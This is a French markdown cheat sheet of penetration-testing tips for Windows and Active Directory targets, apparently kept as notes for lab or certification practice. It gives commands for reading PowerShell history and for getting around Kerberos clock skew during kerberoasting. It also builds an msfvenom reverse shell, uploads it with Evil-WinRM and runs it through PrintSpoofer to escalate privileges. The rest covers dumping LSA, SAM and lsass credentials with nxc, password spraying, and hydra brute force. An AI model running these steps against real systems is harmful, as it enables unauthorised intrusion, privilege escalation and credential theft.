## Tips à ne pas oublier 

### Pour chaques nouveaux accès win/ad check l'historique avec la commande :
```powershell
# Afficher le chemin vers fichier historique 
(Get-PSReadLineOption).HistorySavePath

# Afficher le contenu  du fichier dans le terminal
Get-Content (Get-PSReadLineOption).HistorySavePath

# Aller dans le dossier
Set-Location (Split-Path (Get-PSReadLineOption).HistorySavePath)
``` 

### Ne plus avoir d'erreur clock skew lors du kerberoasting**
```bash
sudo systemctl stop systemd-timesyncd
faketime "$(rdate -p -n <DC_IP>)" <commande>
```

### Erreur () exploit python**
```python
python2.7 exp.py
```
### Privesc seimpersonate qui ne renvoie pas le résultat dans winrm
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f exe -o sh.exe
puis upload via evilwinrm

*Evil-WinRM PS C:\Users\charlotte\Desktop> upload sh.exe

*Evil-WinRM PS C:\Users\charlotte\Desktop> .\PrintSpoofer64.exe -c 'sh.exe'

#côté kali

nc -lnvp 4444
listening on [any] 4444 ...
...
C:\Windows\system32>
``` 
### Dumps creds 
```bash
Avec nxc toujours faire --local-host --lsa --sam puis après faire un -M lsassy
```
### Après pivot 
``` 
Toujours password spray sur ms02 et DC01
``` 
### Fichiers sans infos dans share (ftp/smb)
``` 
Toujours exiftool pour voir les autheurs, possibilité de récuperer des usernames
Exiftool <file> | grep Author 
Puis hydra -L <user trouvé> -p /usr/share/wordlist/rockyou.txt service://<ip>
``` 
### Machine Win ou AD
```
Toujours regarder les fichiers dossier présent dans la /
``` 


